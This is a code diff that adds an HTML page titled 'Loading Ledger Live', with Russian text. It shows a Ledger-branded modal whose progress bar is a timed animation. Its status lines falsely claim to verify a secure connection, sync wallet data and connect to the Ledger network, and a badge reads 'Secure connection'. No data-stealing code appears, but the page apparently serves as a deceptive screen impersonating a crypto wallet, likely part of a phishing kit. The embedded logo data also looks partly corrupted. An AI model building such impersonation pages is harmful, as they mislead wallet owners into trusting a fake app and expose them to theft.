@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Ledger Live</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            background-color: #0F0F14;
+            color: #ffffff;
+        }
+
+        .extension-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-container {
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            width: 500px;
+            max-width: 90vw;
+            background: #1A1A24;
+            border-radius: 16px;
+            display: flex;
+            flex-direction: column;
+            z-index: 1001;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 40px;
+        }
+
+        .logo {
+            width: 160px;
+            height: 40px;
+            background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTYwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICAgPHBhdGggZD0iTTM1LjM2NCAxMy4wOTFIMzkuODM2VjI3SDE1LjgxOFYxMy4wOTFIMjAuMjczVjIzLjM2NEgzNS4zNjRWMTMuMDkxWiIgZmlsbD0id2hpdGUiLz4KICAgIDxwYXRoIGQ9Ik00NS4wMjMgMjdWMTMuMDkxSDUwLjM2NVYyNy4wMDZINDUuMDIzVjI3Wk00OC41MDMgMTEuNzVDNDcuNzkzIDExLjc1IDQ3LjE4IDExLjUwOCA0Ni42NjUgMTEuMDIzQzQ2LjE1MiAxMC41MzggNDUuODk1IDkuOTU4IDQ1Ljg5NSA5LjI4MUM0NS44OTUgOC41OSA0Ni4xNTIgOCAyNC Y2NjUgNy41MTJDNDY4MS43IDcuMDI3IDQ3Ljc5MyA2Ljc4NSA0OC41MDMgNi43ODVDNBLL4yIlY2Ljc4NSA0OS44MzIgNy4wMjcgNTAuMzQ3IDcuNTEyQzUwLjg2MiA4IDUxLjExOSA4LjU5IDUxLjExOSA5LjI4MUM1MS4xMTkgOS45NTggNTAuODYyIDEwLjUzOCA1MC4zNDcgMTEuMDIzQzQ5LjgzMiAxMS41MDggNDkuMjIgMTEuNzUgNDguNTAzIDExLjc1WiIgZmlsbD0id2hpdGUiLz4KICAgIDxwYXRoIGQ9Ik02MS43OTIgMjcuMTk5QzU5Ljk5MiAyNy4xOTkgNTguMzg1IDI2Ljg1MiA1Ni45NyAyNi4xNTlDNTUuNTU1IDI1LjQ2NiA1NC40NDYgMjQuNTEyIDUzLjY0MyAyMy4yOThDNTIuODQgMjIuMDggNTIuNDM5IDIwLjcgNTIuNDM5IDE5LjE1OUM1Mi40MzkgMTcuNjE5IDUyLjg0IDE2LjIzOSA1My42NDMgMTUuMDIxQzU0LjQ0NiAxMy44MDMgNTUuNTU1IDEyLjg0NiA1Ni45NyAxMi4xNTNDNTguMzg1IDExLjQ2IDU5Ljk5MiAxMS4xMTQgNjEuNzkyIDExLjExNEM2My41OTIgMTEuMTE0IDY1LjE5OSAxMS40NiA2Ni42MTQgMTIuMTUzQzY4LjAyOSAxMi44NDYgNjkuMTM4IDEzLjgwMyA2OS45NDEgMTUuMDIxQzcwLjc0NCAxNi4yMzkgNzEuMTQ2IDE3LjYxOSA3MS4xNDYgMTkuMTU5QzcxLjE0NiAyMC43IDcwLjc0NCAyMi4wOCA2OS45NDEgMjMuMjk4QzY5LjEzOCAyNC41MTIgNjguMDI5IDI1LjQ2NiA2Ni42MTQgMjYuMTU5QzY1LjE5OSAyNi44NTIgNjMuNTkyIDI3LjE5OSA2MS43OTIgMjcuMTk5Wk02MS43OTIgMjMuMjI3QzYzLjE2NSAyMy4yMjcgNjQuMjY4IDIyLjgyNiA2NS4xMDEgMjIuMDIzQzY1LjkzMyAyMS4yMiA2Ni4zNDkgMjAuMzE4IDY2LjM0OSAxOS4xNTlDNjYuMzQ5IDE3Ljk5OSA2NS45MzMgMTcuMTAyIDY1LjEwMSAxNi4xMjVDNjQuMjY4IDE1LjE0OCA2My4xNjUgMTQuNjU5IDYxLjc5MiAxNC42NTlDNjAuNDE5IDE0LjY1OSA1OS4zMTYgMTUuMTQ4IDU4LjQ4MyAxNi4xMjVDNTcuNjUxIDE3LjEwMiA1Ny4yMzUgMTgsMSA1Ny4yMzUgMTkuMTU5QzU3LjIzNSAyMC4zMTggNTcuNjUxIDIxLjIyIDU4LjQ4MyAyMi4wMjNDNTkuMzE2IDIyLjgyNiA2MC40MTkgMjMuMjI3IDYxLjc5MiAyMy4yMjdaIiBmaWxsPSJ3aGl0ZSIvPgogICAgPHBhdGggZD0iTTc0LjcwNSAyN1YxMy4wOTFIOTguMzQxVjI3SDkzSDc0LjcwNVpNNzkuNjU5IDE2LjI2N1YxOS4zNTJIOTMuNTU3VjE2LjI2N0g3OS42NTlaTTc5LjY1OSAyMi4xNTlWMjMuODI0SDkzLjU1N1YyMi4xNTlINzkuNjU5WiIgZmlsbD0id2hpdGUiLz4KICAgIDxwYXRoIGQ9Ik0xMDEuMDIzIDI3VjEzLjA5MUgxMDYuMzY1VjI3LjAwNkgxMDEuMDIzVjI3Wk0xMDQuNTAzIDExLjc1QzEwMy43OTMgMTEuNzUgMTAzLjE4IDExLjUwOCAxMDIuNjY1IDExLjAyM0MxMDIuMTUyIDEwLjUzOCAxMDEuODk1IDkuOTU4IDEwMS44OTUgOS4yODFDMTAxLjg5NSA4LjU5IDEwMi4xNTIgOCAxMDIuNjY1IDcuNTEyQzEwMy4xOCA3LjAyNyAxMDMuNzkzIDYuNzg1IDEwNC41MDMgNi43ODVDMTAmNS4yMTMgNi43ODUgMTA1LjgzMiA3LjAyNyAxMDYuMzQ3IDcuNTEyQzEwNi44NjIgOCAxMDcuMTE5IDguNTkgMTA3LjExOSA5LjI4MUMxMDcuMTE5IDkuOTU4IDEwNi44NjIgMTAuNTM4IDEwNi4zNDcgMTEuMDIzQzEwNS44MzIgMTEuNTA4IDEwNS4yMiAxMS43NSAxMDQuNTAzIDExLjc1WiIgZmlsbD0id2hpdGUiLz4KICAgIDxwYXRoIGQ9Ik0xMTguODM1IDI3LjE5OUMxMTcuMiAyNy4xOTkgMTE1LjY5NiAyNi44NTIgMTE0LjMyMyAyNi4xNTlDMTEyLjk1IDI1LjQ2NiAxMTEuODc2IDI0LjUgMTExLjEwMiAyMy4yNjFDMTEwLjMyOSAyMi4wMjMgMTA5Ljk0MiAyMC42MzEgMTA5Ljk0MiAxOS4wODVDMTA5Ljk0MiAxNy41MzggMTEwLjMyOSAxNi4xNDggMTExLjEwMiAxNC45MEMxMTEuODc2IDEzLjY4MiAxMTIuOTUgMTIuNzQ0IDExNC4zMjMgMTIuMDg4QzExNS42OTYgMTEuNDM4IDExNy4yIDExLjExNCAxMTguODM1IDExLjExNEMxMjAuMzkyIDExLjExNCAxMjEuNzYyIDExLjM3NCAxMjIuOTQ2IDExLjg5NUM1MjQuNzQyIDEyLjQxNyAxMjYuMDA5IDEyLjk5MSAxMjYuNzQ0IDEzLjYxOUwxMjQuNDYzIDE2LjI2N0MxMjMuNzEgMTUuODY0IDEyMi45OTYgMTUuNTc2IDEyMi4zMTkgMTUuNDAzQzEyMS42NDcgMTUuMjMgMTIwLjg1NiAxNS4xNDQgMTIwLjA0OCAxNS4xNDRDMTE4LjY3NCAxNS4xNDQgMTE3LjUzOCAxNS40NzkgMTE2LjYzOSAxNi4xNDhDMTE1Ljc0IDE2LjgxNyAxMTUuMjkgMTcuODI0IDExNS4yOSAxOS4xNzdDMTE1LjI5IDIwLjUzIDExNS43NDMgMjEuNTMgMTE2LjY1MSAyMi4xNzZDMTE3LjU1NiAyMi44MjYgMTE4LjY5NSAyMy4xNTMgMTIwLjA2OCAyMy4xNTNDMTIwLjg2MyAyMy4xNTMgMTMwLjY0NCAyMy4wNjcgMTIyLjMzNiAyMi44OTRDMTIzLjAzMSAyMi43MjEgMTIzLjc1NiAyMi40MzYgMTI0LjUxMyAyMi4wMzlMMTI2Ljc0NCAyNC42ODhDMTI2LjAwOSAyNS4zMTYgMTI0Ljc0NyAyNS4zODMgMTIyLjk1OCAyNi40MDVDMTIxLjc3MSAyNi45MzUgMTIwLjQwNSAyNy4xOTkgMTE4LjgzNSAyNy4xOTlaIiBmaWxsPSJ3aGl0ZSIvPgogICAgPHBhdGggZD0iTTEzOC44MzMgMjcuMTkyQzEzNy4wNDggMjcuMTkyIDEzNS40NTEgMjYuODQ1IDEzNC4wNDQgMjYuMTUyQzEzMi42MzcgMjUuNDU5IDEzMS41MzIgMjQuNTAyIDEzMC43MzIgMjMuMjg0QzEyOS45MzMgMjIuMDY2IDEzOS41MzMgMjAuNjkgMTI5LjUzMyAxOS4xNTVDMTI5LjUzMyAxNy42MjEgMTI5LjkzMyAxNi4yNDQgMTMwLjczMiAxNS4wMjZDMTMxLjUzMiAxMy44MDggMTMyLjYzNyAxMi44NTMgMTM0LjA0NCAxMi4xNkMxMzUuNDUxIDExLjQ2NyAxMzcuMDQ4IDExLjEyMSAxMzguODMzIDExLjEyMUMxNDAuNDggMTEuMTIxIDEzMS45MyAxMS4zOTYgMTQzLjE4MyAxMS45NDdDMTQ0LjQ0NCAxMi40OTggMTQ1LjQ0NiAxMy4xNyAxNDYuMTkxIDEzLjk2MkwxNDMuOTYgMTYuNDZDMTQzLjM3MSAxNS45OTggMTQyLjY3NSAxNS42MzYgMTQxLjg3NiAxNS4zNzZDMTQxLjA3NyAxNS4xMTYgMTQwLjIzMiAxNC45ODcgMTM5LjMzMyAxNC45ODdDMTM3Ljk1OSAxNC45ODcgMTM2Ljg1NiAxNS4zNzYgMTM2LjAyMyAxNi4xNTVDMTM1LjE5IDE2LjkzNCAxMzQuNzc0IDE3LjkyNCAxMzQuNzc0IDE5LjEyNUMxMzQuNzc0IDIwLjMyNiAxMzUuMTkgMjEuMzE2IDEzNi4wMjMgMjIuMDk1QzEzNi44NTYgMjIuODc0IDEzNy45NTkgMjMuMjY0IDEzOS4zMzMgMjMuMjY0QzE0MC4yMzIgMjMuMjY0IDE0MS4wNzcgMjMuMTI4IDE0MS44NzYgMjIuODU2QzE0Mi42NzUgMjIuNTg0IDE0My4zNzEgMjIuMjE1IDE0My45NiAxMjMuNzQ5TDE0Ni4xOTEgMjYuMjU0QzE0NS40NDYgMjcuMDE4IDE0NC40NDIgMjcuNjkgMTQzLjE3NyAyOC4yNzFDMTQxLjkxMiAyOC44NTIgMTQwLjQ1OCAyOS4xNDIgMTM4LjgzMyAyOS4xNDJaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4=");
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .modal-body {
+            padding: 24px 32px 40px;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 30px 0 20px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #41CCB4 0%, #00C3FF 100%);
+            border-radius: 3px;
+            transition: width 10s linear;
+        }
+
+        .status-text {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            margin-top: 12px;
+            text-align: center;
+            font-weight: 400;
+        }
+
+        .percentage {
+            color: #fff;
+            font-weight: 600;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 32px;
+            gap: 8px;
+            opacity: 0.7;
+        }
+
+        .secure-badge svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .secure-text {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+    </style>
+</head>
+<body>
+
+<div class="extension-modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-container">
+        <div class="logo-container">
+            <div class="logo"></div>
+        </div>
+        <div class="modal-body">
+            <div class="percentage">0%</div>
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="status-text">Инициализация кошелька...</div>
+            <div class="status-text">Пожалуйста, не закрывайте это окно</div>
+            <div class="secure-badge">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM12 11.99H19C18.47 16.11 15.72 19.78 12 20.93V12H5V6.3L12 3.19V11.99Z" fill="#ffffff"/>
+                </svg>
+                <span class="secure-text">Безопасное соединение</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const progressBar = document.getElementById('progressBar');
+        const percentageDiv = document.querySelector('.percentage');
+        const statusText = document.querySelector('.status-text');
+        
+        // Анимация прогресс-бара
+        progressBar.style.width = '100%';
+        
+        // Обновление процентов
+        let percent = 0;
+        const interval = setInterval(() => {
+            percent += 1;
+            percentageDiv.textContent = `${percent}%`;
+            
+            // Обновление текстового сообщения в зависимости от прогресса
+            if (percent === 25) {
+                statusText.textContent = 'Проверка защищенного соединения...';
+            } else if (percent === 50) {
+                statusText.textContent = 'Синхронизация данных кошелька...';
+            } else if (percent === 75) {
+                statusText.textContent = 'Подключение к сети Ledger...';
+            } else if (percent === 95) {
+                statusText.textContent = 'Завершение инициализации...';
+            } else if (percent === 100) {
+                statusText.textContent = 'Загрузка завершена успешно!';
+                document.querySelectorAll('.status-text')[1].textContent = 'Запуск приложения...';
+            }
+            
+            if (percent >= 100) {
+                clearInterval(interval);
+            }
+        }, 100); 
+    });
+</script>
+
+</body>
+</html>
